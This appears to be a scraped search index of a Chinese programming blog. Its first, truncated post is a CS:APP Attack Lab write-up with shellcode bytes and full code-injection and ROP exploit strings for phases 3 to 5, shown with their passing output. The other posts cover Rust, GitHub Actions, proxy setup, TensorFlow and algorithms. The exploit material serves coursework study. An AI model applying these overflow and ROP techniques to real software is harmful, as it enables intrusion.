的字符串表示放在 0x5566f7c8，编译再反汇编得到机器码 123456789phase3.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 c8 f7 66 55 mov $0x5566f7c8,%rdi 7: 68 a0 17 40 00 pushq $0x4017a0 c: c3 retq 查表得出 cookie 字符串的 16 进制表示为 36 33 31 34 39 33 38 30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\\0’，得到攻击字符串如下 12345648 c7 c7 c8 f7 66 55 68a0 17 40 00 c3 00 00 0000 00 00 00 00 00 00 00a8 f7 66 55 00 00 00 0036 33 31 34 39 33 38 3000 转换输入运行 1234567892017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -qCookie: 0x63149380Type string:Touch3!: You called touch3(&quot;63149380&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 第二阶段在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施： 1.函数栈随机化 ，无法再获取绝对地址。 2.栈内存的内容被锁定为不可执行。 故此，我们需要使用 ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用 ret 指令返回完成所需操作。 phase_4此关需用 ROP 方法完成 phase_2 内容。那么就需要在操作中得到 cookie 值，那么只有用 pop 指令了，需要指令为。 123popq %raxmovq %rax,%rdiret 查找官方的 write up，得知对应机器码，然后在在 rtarget 文件的反汇编文件中利用 vim 查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。 123456700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 003c 18 40 00 00 00 00 00 /* popq rax */80 93 14 63 00 00 00 00 /* cookie */49 18 40 00 00 00 00 00 /* movq %rax,%rdi */cc 16 40 00 00 00 00 00 /* touch2 */ 转换输入运行 1234562017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtargetCookie: 0x63149380Type string:Touch2!: You called touch2(0x63149380)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! phase_5此关为 phase_3 的 ROP 版本，我们需要查找 start_farm 到 end_farm 中的 gadgets，拼凑出代码实现 phase_3 中插入代码的功能。还需注意： 1.0x90 代表 nop，除了将 pc 加 1 之外不做任何事。 2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 需要的指令有 12345678movq %rsp,%raxmovq %rax,%rdipopq %raxmovl %eax,%ecxmovl %ecx,%edxmovl %edx,%esilea(%rdi, %rsi, 1),%raxmovq %rax,%rdi 则攻击字符串为 12345678910111213141500 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00bd 18 40 00 00 00 00 00 /* gadget1 */49 18 40 00 00 00 00 00 /* gadget2 */30 18 40 00 00 00 00 00 /* gadget3 */48 00 00 00 00 00 00 00 /* cookie字符串偏移量*/13 19 40 00 00 00 00 00 /* gadget4 */ca 18 40 00 00 00 00 00 /* gadget5 */b7 18 40 00 00 00 00 00 /* gadget6 */69 18 40 00 00 00 00 00 /* gadget7 */49 18 40 00 00 00 00 00 /* gadget8 */a0 17 40 00 00 00 00 00 /* touch3地址 */36 33 31 34 39 33 38 30 /* cookie字符串 */00 转换文件运行 1234562017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtargetCookie: 0x63149380Type string:Touch3!: You called touch3(&quot;63149380&quot;)Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! 到此为止","link":"/2018/12/08/CSAPP-Attack-lab/"},{"title":"CS:APP解题记录","text":"CS:APP 2.6012345678910111213#include &lt;stdio.h&gt;unsigned replace_byte(unsigned x, int i, unsigned char b){ x = x &amp; (~(0XFF &lt;&lt; (i &lt;&lt; 3)));//相应字节置零 x = x | (b &lt;&lt; (i &lt;&lt; 3)); //相应字节改为char b return x;}int main(){ unsigned ret = replace_byte(0X12345678, 1, 0XAB); printf(&quot;0X%X\\n&quot;, ret); return 0;} 0X1234AB78 利用按位运算$x \\&amp; 1 = x , b | 0 = b$。 Csapp 2.6512345678910111213141516#include &lt;stdio.h&gt;int odd_ones(unsigned x){ x ^= x &gt;&gt; 16; x ^= x &gt;&gt; 8; x ^= x &gt;&gt; 4; x ^= x &gt;&gt; 2; x ^= x &gt;&gt; 1; return x &amp; 1;}int main(){ int x = odd_ones(0XB); printf(&quot;%d\\n&quot;, x); return 0;} 1 对 32 位编码，1 亦或所有 0 仍为 1，偶数个 1 连续亦或结果为 0，奇数个 1 连续亦或结果为 1。对 32 位数，按照右移 16，8，4，2，1 依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。 Csapp 2.67A在 int 为 w 位的机器中，移位长度不应该超过$w - 1$。 B1234567891011#include &lt;stdio.h&gt;#include &lt;limits.h&gt;int int_size_is_32(){ return 1 &lt;&lt; 31 == INT_MIN;}int main(){ printf(&quot;%d\\n&quot;, int_size_is_32()); return 0;} 1 若 int 为 32 位,则$1 &lt;&lt; 31 ==$ INT_MIN. C1234567891011#include &lt;stdio.h&gt;#include &lt;limits.h&gt;int int_size_is_32_for_16(){ return (1 &lt;&lt; 15 != INT_MIN) &amp;&amp; ((1 &lt;&lt; 31) == INT_MIN);}int main(){ printf(&quot;%d\\n&quot;, int_size_is_32_for_16()); return 0;} 1 当$1 &lt;&lt; 15 !=$ INT_MIN，证明 int 非 16 位后，后面即可判断 int 是否为 32 位. Csapp 2.6812345678910#include &lt;stdio.h&gt;int lower_one_mask(int n){ return (int)(0XFFFFFFFFu &gt;&gt; (32 - n));}int main(){ printf(&quot;0X%X\\n&quot;, lower_one_mask(6)); return 0;} 0X3F 将无符号 int 最大值右移$(32 - n)$位，进行了逻辑右移，再强制转换为有符号 int。","link":"/2018/11/08/CSAPP-problems/"},{"title":"Github Actions简介","text":"简介GitHub Actions可帮助开发人员在软件开发生命周期内自动化任务。 GitHub Actions 是事件驱动的，这意味着可以在发生指定事件后运行一系列命令。例如，每当有人为仓库新建pr时，可以自动运行测试脚本。 该图演示了如何使用 GitHub Actions 自动运行软件测试脚本。事件自动触发包job含的workflow。然后，job将使用step来控制action的执行顺序。这些action即是自动化测试软件的命令。 Github Actions 的组件以下是可协同运行job的多个GitHub Actions组件的列表。可以看到这些组件之间如何交互 workflowworkflow您添加到代码仓库中的自动化过程。其由一个或多个job组成，可以由事件调度或触发。该workflow可用于在 GitHub 上构建，测试，打包，发布或部署项目。 Eventsevent是触发workflow的特定活动。例如，当有人将commit 推送到仓库或创建issue或pr时，Github 会产生envent。还可以使用 repository dispatch webhook在发生外部事件时触发workflow。有关可用于触发workflow的evrnt的完整列表，查看Events that trigger workflows。 Jobsjob是在同一runner上执行的一组step。默认情况下，具有多个job的workflow程将并行运行这些job。还可以配置workflow以按顺序运行job。例如，一个workflow可以有两个顺序执行的job来构建和测试代码，其中测试job取决于构建job的状态。如果构建job失败，则测试job将不会运行。 Stepsstep是可以在job中运行命令的单个任务。step可以是操作或shell命令。job中的每个step都在同一runner上执行，从而使该job中的操作可以彼此共享数据。 Actionsaction是独立的命令，组合成step以构建job, action是工作流中最小的可移植构建块。可以创建自己的action，也可以使用 GitHub 社区创建的action。要在工作流中使用action，必须将其包括在一个step中。 Runnersrunner是已安装GitHub Actions runner 应用程序的服务器。可以使用 GitHub 托管的runner，也可以使用自己的runner。runner监听可用的job，一次运行一个job，并将进度，日志和结果反馈给 GitHub。对于由 GitHub 托管的runner，workflow中的每个job都在全新的虚拟环境中运行。 GitHub 托管的runner基于 Ubuntu Linux，Microsoft Windows 和 macOS。有关 GitHub 托管的runner的信息，请参阅”Virtual environments for GitHub-hosted runners“。如果需要其他的 OS 或特定的硬件配置，则可以托管自己的runner。有关自托管runner的信息，请参阅”Hosting your own runners“。 创建样例 workflowGitHub Actions 使用YAML语法定义event，job和step。这些 YAML 文件存储在代码存储库中的.github / workflows目录中。 可以在仓库中创建示例的workflow，该workflow在每次推送代码时自动触发一系列命令。在此workflow中，GitHub Actions 使用了actions market的checkout和setup-node action，然后安装软件依赖项，并运行bat -v。 首先在项目中创建.github/workflow目录 在其中，创建一个learn-github-actions.yml文件，内容如下： 12345678910name: learn-github-actionson: [push]jobs: check-bats-version: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-node@v1 - run: npm install -g bats - run: bats -v commit这些修改并且push代码到仓库 现在，新的GitHub Actions工作流文件已安装在代码仓库中，并且每次有人将更改推送到仓库时，它将自动运行。有关作业的执行历史记录的详细信息，请参阅”Viewing the workflow’s activity“。 要更详细了解workflow文件，参阅Understanding the workflow file。 自动构建 Hexo 博客配置密钥首先生成一对新的密钥 1ssh-keygen -t rsa -b 4096 -C &quot;$(git config user.email)&quot; -f github-deploy-key -N &quot;&quot; 在对应的 gihtub 仓库设置中的Deploy keys,将刚才生成的密钥对中的公钥添加进去;然后在设置中的Secrets里面新建一个Secret，名为DEPLOY_KEY，将刚才生成的密钥对中的私钥添加进去. 配置workflow在项目根目录下新建.github/workflow/ci.yaml，内容为 1234567891011121314151617181920212223242526272829303132333435363738394041424344name: Deployon: push: branches: - hexo pull_request: branches: - hexojobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 with: ref: hexo - uses: actions/setup-node@v2 with: node-version: &quot;12&quot; - name: Cache node modules uses: actions/cache@v2 env: cache-name: cache-node-modules with: # npm cache files are stored in `~/.npm` on Linux/macOS path: ~/.npm key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }} restore-keys: | ${{ runner.os }}-build-${{ env.cache-name }}- ${{ runner.os }}-build- ${{ runner.os }}- - name: Install Dependencies run: | npm install -g hexo-cli npm install - name: build run: | hexo g - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.DEPLOY_KEY }} publish_dir: public 不过部署 Hexo 博客的话,目前 Vercel 更简单,在国内访问也更快,本博客的 Github Actions 已经被禁用了,由 vercel 进行部署.","link":"/2020/06/19/Github-Actions-Intro/"},{"title":"Linux使用clash代理","text":"起因偶然发现百度云的学生服务器挺便宜，2 核心 4g 内存机型一个月只要 18 元，有个随时随地能够访问的 Linux 环境还是挺好的，遂购入。新系统初始化完成，第一件事当然是来一套ohmyzsh，结果这就出了问题，git clone太慢了。 遂想到是不是该给其使用一下代理。不然之后不止git clone，很多资源都无法下载。 使用clashclash是一款使用go语言开发的多平台代理工具，支持ss/v2ray等多种协议，在macOS，windows上使用起来很方便，在没有GUI的Linux也只需要稍加配置。 先从这里下载clash的linux-amd64可执行文件。 123naruto@bdy:~$ gzip -d clash-linux-amd64-v1.1.0.gznaruto@bdy:~$ chmod +x clash-linux-amd64-v1.1.0naruto@bdy:~$ sudo mv clash-linux-amd64-v1.1.0 /usr/local/bin/clash 然后下载Country.mmdb。 12naruto@bdy:~$ mkdir -p .config/clashnaruto@bdy:~$ mv Country.mmdb .config/clash/ 之后，需要最关键的clash代理配置文件config.yaml，一般机场都会提供，同样将其放到.config/clash目录下。 之后先直接启动clash看看效果。 启动遇到WARN[0000] Failed to start Redir UDP Listener: operation not permitted，可以使用sudo clash启动。 配置 GUI 界面从上一段的图中可以看到，clash服务有一个RESTful API的服务，通过其我们可以访问 web 管理页面。在config.yaml中制定即可。比较受欢迎的是yacd，可以直接下载打包好的版本。 12naruto@bdy:~$ unzip yacd-gh-pages.zipnaruto@bdy:~$ mv yacd-gh-pages .config/clash/dashboard 在config.yaml中如下设置： 12external-ui: &quot;dashboard&quot;secret: &quot;&quot; 启动clash后，浏览器使用ip:port/ui的方式访问，如下所示。 享用代理在 GUI 界面选择好代理服务器后，就可以使用代理了。打开另一个终端窗口，执行如下命令，设置http(s)代理环境变量。 1export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 接下来，进行一些完善工作。首先每次都手动启动clash并且占用一个终端窗口是很不方便的，先将clash作为一个daemon进程。参照开发者推荐，使用pm2。 12$ npm install -g nrm$ pm2 start clash 然后是将代理命令作为函数写入.zshrc. 注意，下面使用了zsh语法，和bash略有不同。 1234567891011121314PROXY_IP=127.0.0.1PROXY_PORT=7890function Proxy() { if [ &quot;$1&quot; = &quot;on&quot; ]; then export https_proxy=$PROXY_IP:$PROXY_PORT export http_proxy=$PROXY_IP:$PROXY_PORT echo Proxy On else unset https_proxy unset http_proxy echo Proxy Off fi} 然后试试看，非常愉快。 最后，我们来装一个rust试试。","link":"/2020/08/21/Linux-clash-proxy/"},{"title":"Python ElementTree数据清洗","text":"简介XML 是一种可扩展标记语言，被用来传输和存储数据。它是一种有逻辑的树结构。 Python 使用 xml.ElementTree 解析123import xml.etree.ElementTree as ETimport codecsimport json codecs用于打开文件，json用于保存清洗完的数据。 123tree = ET.parse() #获取目录树root = tree.getroot() #得到树根root = ET.fromstring() #从字符串直接解析出树根 获取树根，然后进行操作 123456789101112131415root.tag #root元素的标记名root.attrib #root元素的属性，为一个dicfor child in root: #便利子元素 print(child.tag, child.attrib)root[0][1].text #将元素视为多维数组,用下标访问root.find(&quot;element&quot;).text #找出root下element下的内容字符串title = root.get(&quot;Title&quot;) #获取root元素的title属性for neighbor in root.iter('neighbor'): #遍历所有特定元素,递归到所有，子、孙...元素 print(neighbor.attrib)for country in root.findall('country'): #找出所有country元素，仅子代 rank = country.find('rank').text name = country.get('name') print(name, rank)for country in root.find('country'): #仅找出第一个符合的子代 其他涉及知识123456789import osdef mkdir(path): #创建文件夹 if not os.path.exists(path): os.mkdir(path)for son_path in os.listdir(root_path): #遍历root_path下的文件json.dump(dic, file_obj, ensure_ascii=False, indent=4, separators=(',', ': ')) #将字典dic输出到文件file_obj中,不对ascii进行编码,缩进4,分隔符为','以及': ' 暂时到此","link":"/2018/12/09/Python-dataclean/"},{"title":"Rust智能指针Cow","text":"定义Cow是一个提供了写时克隆功能的智能指针，它可以包装对数据的借用，当需要修改数据或者获取数据的所有权时，对数据clone。它的定义如下： 1234567pub enum Cow&lt;'a, B&gt;where B: 'a + ToOwned + ?Sized, { Borrowed(&amp;'a B), Owned(&lt;B as ToOwned&gt;::Owned),} Cow名为clone-on-write，但是对数据类型B的trait要求是ToOwned，而不是Clone。这是因为Clone只能从&amp;T生成T，但是ToOwned泛化为从任意给定类型的借用数据构建新类型的数据。功能更为强大。 如下一段示例代码，将Cow应用在结构体中。 123456789101112131415161718192021222324252627282930313233343536373839404142use std::borrow::Cow;struct Items&lt;'a, X: 'a&gt;where [X]: ToOwned&lt;Owned = Vec&lt;X&gt;&gt;,{ values: Cow&lt;'a, [X]&gt;,}impl&lt;'a, X: Clone + 'a&gt; Items&lt;'a, X&gt;where [X]: ToOwned&lt;Owned = Vec&lt;X&gt;&gt;,{ fn new(v: Cow&lt;'a, [X]&gt;) -&gt; Self { Items { values: v } }}// Creates a container from borrowed values of a slicefn main() { let readonly = [1, 2]; let borrowed = Items::new((&amp;readonly[..]).into()); match borrowed { Items { values: Cow::Borrowed(b), } =&gt; println!(&quot;borrowed {:?}&quot;, b), _ =&gt; panic!(&quot;expect borrowed value&quot;), } let mut clone_on_write = borrowed; // Mutates the data from slice into owned vec and pushes a new value on top clone_on_write.values.to_mut().push(3); println!(&quot;clone_on_write = {:?}&quot;, clone_on_write.values); // The data was mutated. Let check it out. match clone_on_write { Items { values: Cow::Owned(_), } =&gt; println!(&quot;clone_on_write contains owned data&quot;), _ =&gt; panic!(&quot;expect owned data&quot;), }} 运行生成如下结果，可见对借用的数据进行修改后，发生了克隆。 123borrowed [1, 2]clone_on_write = [1, 2, 3]clone_on_write contains owned data 使用试想这样一个场景，我们需要给处理一些Url，其中一部分是https://开头的，而另一部分不是，现在要给缺少https://前缀的Url加上前缀。 使用Cow，函数如下： 1234567891011121314fn add_prefix_by_cow&lt;'a, T&gt;(urls: T, prefix: &amp;str) -&gt; Vec&lt;Cow&lt;'a, String&gt;&gt;where T: IntoIterator&lt;Item = &amp;'a String&gt;,{ urls.into_iter() .map(|url| { if url.starts_with(prefix) { Cow::Borrowed(url) } else { Cow::Owned(String::with_capacity(url.len() + prefix.len()) + prefix + url) } }) .collect()} 不使用Cow，函数如下： 1234567891011121314fn add_prefix_by_clone&lt;'a, T&gt;(urls: T, prefix: &amp;'a str) -&gt; Vec&lt;String&gt;where T: IntoIterator&lt;Item = &amp;'a String&gt;,{ urls.into_iter() .map(|url| { if url.starts_with(prefix) { url.clone() } else { url.clone() + prefix } }) .collect()} 用Criterion来进行 benchmark 测试 12345678910111213141516171819202122232425262728293031fn bench(c: &amp;mut Criterion) { let mut group = c.benchmark_group(&quot;cow_bench&quot;); group.sampling_mode(SamplingMode::Linear); group.bench_function(&quot;cow&quot;, |b| { b.iter_batched( || { let pre = vec![&quot;https://127.0.0.1&quot;.to_string(); 1024]; let non_pre = vec![&quot;127.0.0.1&quot;.to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_cow(&amp;v, &quot;https://&quot;); }, BatchSize::SmallInput, ) }); group.bench_function(&quot;clone&quot;, |b| { b.iter_batched( || { let pre = vec![&quot;https://127.0.0.1&quot;.to_string(); 1024]; let non_pre = vec![&quot;127.0.0.1&quot;.to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_clone(&amp;v, &quot;https://&quot;); }, BatchSize::SmallInput, ) }); group.finish();} 输出如下： 12cow_bench/cow time: [256.10 us 259.48 us 262.41 us]cow_bench/clone time: [448.13 us 457.38 us 467.73 us] 生成分析图片如下图所示，可见Cow在大量的内存操作时，能尽可能的进行内存共享，延迟耗时的克隆操作，进行更加细致的内存操作控制。","link":"/2021/01/30/Rust-Smartpointer-Cow/"},{"title":"Ubuntu安装tf-gpu","text":"显卡驱动最新的 18.04.3 已经可以安装 430 驱动 1sudo apt install nvidia-driver-430 安装要求官网有安装所需软件要求 安装 cuda 及其组件去官网下载cuda 安装 runfile 及其补丁， 1234# Add NVIDIA package repositorychmod +x ./cuda_10.0.130_410.48_linux.run ./cuda_10.0.130.1_linux.runsudo ./cuda_10.0.130_410.48_linux.runsudo ./cuda_10.0.130.1_linux.run 注意不要重复安装 nvidia 显卡驱动。然后下载cudnn. 1234tar -zxvf cudnn-10.0-linux-x64-v7.6.2.24.tgzsudo cp cuda/include/cudnn.h /usr/local/cuda/includesudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn* 然后设置环境变量(cuda 安装完成时会提示) 12export PATH=/usr/local/cuda/bin/:$PATHexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/extras/CUPTI/lib64 检验下安装 12345wmc@omen:~$ nvcc -Vnvcc: NVIDIA (R) Cuda compiler driverCopyright (c) 2005-2018 NVIDIA CorporationBuilt on Sat_Aug_25_21:08:01_CDT_2018Cuda compilation tools, release 10.0, V10.0.130 AnacondaAnaconda 安装十分简单.去喜闻乐见的tuna下载。 12chmod +x Anaconda3-2019.07-Linux-x86_64.sh./Anaconda3-2019.07-Linux-x86_64.sh 更换 anaconda 和 pip 镜像源 1234567conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/conda config --set show_channel_urls yespip install pip -Upip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 安装完成后，我们使用创建一个新的 python 虚拟环境，安装 tensorflow-gpu. 123conda create -n tensor pip python=3.6source activate tensorpip install --upgrade tensorflow-gpu 安装 jupyter 插件12conda install -c conda-forge jupyter_contrib_nbextensionsjupyter contrib nbextension install --user 将 conda 虚拟环境作为 jupyter 内核123conda activate tensorflowenvpip install ipykernelpython -m ipykernel install --user --name tensorflowenv --display-name &quot;Python (tensorflowenv)&quot; 示例测试12345678910111213141516171819import tensorflow as tfmnist = tf.keras.datasets.mnist(x_train, y_train),(x_test, y_test) = mnist.load_data()x_train, x_test = x_train / 255.0, x_test / 255.0model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(input_shape=(28, 28)), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation='softmax')])model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])model.fit(x_train, y_train, epochs=5)model.evaluate(x_test, y_test) 运行结果","link":"/2019/02/01/Ubuntu-install-tf-gpu/"},{"title":"数据结构:BM算法","text":"设计思路BM 算法是一种后缀匹配算法,其具有比 KMP 算法更优秀的性能表现.其核心思想有二,第一是坏字符,坏字符就是 pattern 与 text 从右往左第一失配的在 text 中的字符,二是好后缀,好后缀就是 pattern 与 text 从右往左连续匹配成功的子串.对于坏字符和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词.每次从文档中读取一行进行匹配搜索,每次使用 BM 算法搜索完成后,若搜索到单词,则将主串中开始匹配的位置定为查找到单词的下一行,使用 BM 算法进行下一个匹配搜索,直至搜索完当前行.而后循环直至匹配完整个文档. 代码说明1int* CreateBC(char* pattern, int len); 传入模式串及其长度,返回根据坏字符的跳转数组. 12int* CreateSuffix(char* pattern, int len);int* CreateGS(char* pattern, int len); 两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调用第一个函数返回根据好后缀的跳转数组. 1int bm_search(char* text, int text_len, char* pattern, int pattern_len, int *bc, int *gs); 传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串中查找到模式串的第一个位置,未查找到,则返回-1. 1char* get_line(FILE *article, char (&amp;text)[1000]); 从给定的 article 文件中读取最大 1000 字符的一行,存在 text 位置,读取到文件末尾则返回 NULL. 运行结果 此为从马丁路德金的 I hava a dream 演讲稿中查找 dream 得出的结果.","link":"/2018/12/01/ds-bm/"},{"title":"数据结构:迷宫问题","text":"设计思路图编号如图所示，从上到下，从左到右，给 17 个顶点进行编号，以两个顶点代表一条边，例入 2-3 代表可以从顶点 2 走到顶点 3。问题即为求解从 2 -&gt; 17 的通路。 求解思想求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。 求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。 代码说明结构体及全局变量定义123456789101112131415typedef struct p //表示顶点,用于寻找最短路径时记录路径{ int code; struct p* pre; //前一个顶点} Ver;const int edge_cnt = 29; //边的数量const int ver_cnt = 17; //顶点数量int map[edge_cnt][2]; //记录边int my_stack[MAX] = {0}; //数组模拟栈int my_quque[MAX] = {0}; //数组模拟队列int top = 0; //栈顶指示int front = 0, rear = 0; //队列首位指示bool visit[ver_cnt + 1] = {false}; //记录点是否访问过Ver vers[ver_cnt + 1]; //每个点路径链表头结点 函数定义123456void loadmaze(); //读入迷宫地图void visited(int i); //将点i状态置为访问过bool isvisited(int i); //判断点i是否访问过bool hasway(int s); //从点s出发是否有没去过的可行路径void find_way(int start, int end); //找到一条通路void find_least(int start, int end); //找到一条最短路径 运行结果 实验总结本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。","link":"/2018/11/10/ds-maze/"},{"title":"告别2020庚子鼠年","text":"2020 庚子鼠年，在家上了半年网课，慵懒地躺尸，同时又在焦虑感的驱使下战战兢兢地当个做题家。而后，二进宫实习，同时参加夏令营，拿到 offer；国庆离职，进入实验室，成为临时工。一直在忙碌，一直在焦虑。 「吾之大患，因有吾身」，成长的经历，让我总是被「焦虑」二字困扰。对自己想做的事，隔得很久便开始计划，有一点不顺意便焦虑得不行。人生中并不是很忙的阶段，也因为焦虑变得无端忙碌。好在运气不错，许多目标都实现了，对自己的发展也有了大致的规划。 告别庚子鼠年，我希望自己能克制焦虑的心境，能静下来，做好自己手上的事，潜心读每一篇论文，像一个工程师一样做项目，学习更多的人生知识。 最后，新的一年，要牛气冲天。","link":"/2021/02/11/goodbyte-2020/"},{"title":"Rust生命周期与变形","text":"最近对 rust 的生命周期有一些疑惑，在找资料学习的过程中自然就了解到由 rust 生命周期导出的 rust subtype、variance 的概念，对这一块儿的学习也解答了我一些对其他语言的问题,同时我也被认识的大佬赶鸭子上架,在 BUPT Rust Meetup 做了分享,keynote 讲稿在此。 子类型与变形子类型是程序语言类型系统中的一个概念，Wikipedia 对其有如下解释： If S is a subtype of T, the subtyping relation is often written S &lt;: T, to mean that any term of type S can be safely used in a context where a term of type T is expected. 许多语言的类型系统都支持子类型，最直接、最熟悉的应当就是面向对象中继承关系形成的子类型。例如Cat类继承了Animal类，那么Cat是Animal的子类型（Cat &lt;: Animal），直觉上很容易想到，任何需要Animal的表达式，我们都可以用Cat去替换，这也是里氏替换原则(Liskov substitution principle)： Let $q(x)$ be a property provable about $x$ of type T. Then $q(y)$ should be true for objects $y$ of type $S$ where $S$ is a subtype of T. 继承关系很直接导出了两个具体类型的之间的子类型关系，可由类型构造器产生的一些更复杂的类型之间的子类型关系如何确定呢？ F(T)为类型构造器，S &lt;: T， 那么F(S)和F(T)的有没有子类型关系呢?如果有，谁是谁的子类型呢？复杂类型之间的子类型关系取决于类型构造器，相对于原始类型，可能是保持、反转或者无关。 如果是是保持，即F(S) &lt;: F(T)，则称之为协变(covariant) 如果是反转，即F(T) &lt;: F(S)，则称之为逆变(contravariant) 如果是无关，则称之为不变/抗变(invariant) covariant、contravariant的概念来自于范畴论(Category Theory)中的函子(Functor)。 变形与类型安全在下面的 Java 代码中，Cat[]赋值给Animal[]类型的变量可以通过编译，但是ArrayList&lt;Cat&gt;赋值给ArrayList&lt;Animal&gt;类型的变量则无法通过编译。说明 Java 在编译时对数组采用了协变，而对泛型容器采用了抗变。但是在运行时，对数组元素进行错误的赋值，会抛出运行时错误，这实际是一种对于编译期数组协变的补救，数组采用协变本身是一种很差劲的设计。 123456789101112131415161718192021222324252627282930313233static class Animal { private int name;}static class Cat extends Animal { public Cat() { } public void meow() { System.out.println(&quot;meow&quot;); }}static class Dog extends Animal { public Dog() { } public void bark() { System.out.println(&quot;bark&quot;); }}public static void main(String[] args) throws Exception { // covariant, ok Animal[] animals = new Animal[10]; animals = new Cat[10]; // runtime error animals[0] = new Dog(); // invariant, compile error List&lt;Animal&gt; listAnimals = new ArrayList&lt;Animal&gt;(); listAnimals = new ArrayList&lt;Cat&gt;();} 由此可见，对于支持子类型的语言，变形的设计是非常重要，其会影响程序的类型安全。 那么，什么时候采用协变，什么时候采用逆变，又在什么时候采用抗变呢？ 想一下这样一个程序，一个函数，接受一个笼子参数，笼子里面装着动物，不管传递的笼子参数中装着什么动物，都将笼子中的动物替换成一只狗，这样做的话，当调用完函数后，外部程序继续将笼子中的动物当作原动物来对待，类型安全就完蛋了。 1234567891011121314151617static class Cage&lt;T extends Animal&gt; { public T inner; public Cage(T a) { this.inner = a; }}static void evil_feed(Cage&lt;Animal&gt; cage) { cage.inner = new Dog();}public static void main(String[] args) throws Exception { Cage&lt;Cat&gt; cage = new Cage&lt;Cat&gt;(new Cat()); evil_feed(cage); cage.inner.meow();} 上面的这段 Java 代码当然是无法编译成功的，因为 Java 不对泛型容器使用协变。但是不能使用协变的依据是什么呢？是读写操作。 如果一个容器只读，那么我们可以使用协变，将一个Cage&lt;Cat&gt;当作Cage&lt;Animal&gt;读取，任何时候都不会出错；如果类型只写，那么函数中的操作只能对容器内容进行写入或者什么都不做，此时我们可以考虑逆变，即Cage&lt;Animal&gt;是Cage&lt;Dog&gt;的子类型，对于任何需要Cage&lt;Dog&gt;的函数，我们都可以传入Cage&lt;Animal&gt;，函数只会向其中写入一只Dog，而不关心原来是什么，并且程序也永远也不会去读Cage里的东西，程序语言中，逆变基本不出现；如果类型可读可写，那么只能是抗变，要求类型严格一致来保证类型安全。 类型构造器导致逆变的情况非常少，主要出现在以函数作为类型构造器时： $$F(U) \\rightarrow V$$ 如上的一元函数，接受一个U类型的参数，返回一个V类型的值。如果有U &lt;: T，那么任何需要$F(U) \\rightarrow V$的地方，可以使用$F(T) \\rightarrow V$代替，这很直观，因为U是T的子类型，所以一个能处理 T 类型的函数必然能处理 U 类型，例如一个能计算Animal年龄的函数一定也能计算Cat的年龄，所以有： $$U &lt;: T \\Rightarrow F(T) \\rightarrow V &lt;: F(U) \\rightarrow V$$ 即我们可以用一个作用域较大的函数代替一个作用域较小的函数，因为我们可以在使用时安全地收缩它的作用域至和后者一样，即只使用Animal中属于Cat的那一部分。 Rust 生命周期Rust 没有类型继承，但是 Rust 有 lifetime 啊，所以 Rust 的子类型必定是指 lifetime 之间的关系。 在 Rust 中，'a:'b意思是'a outlives 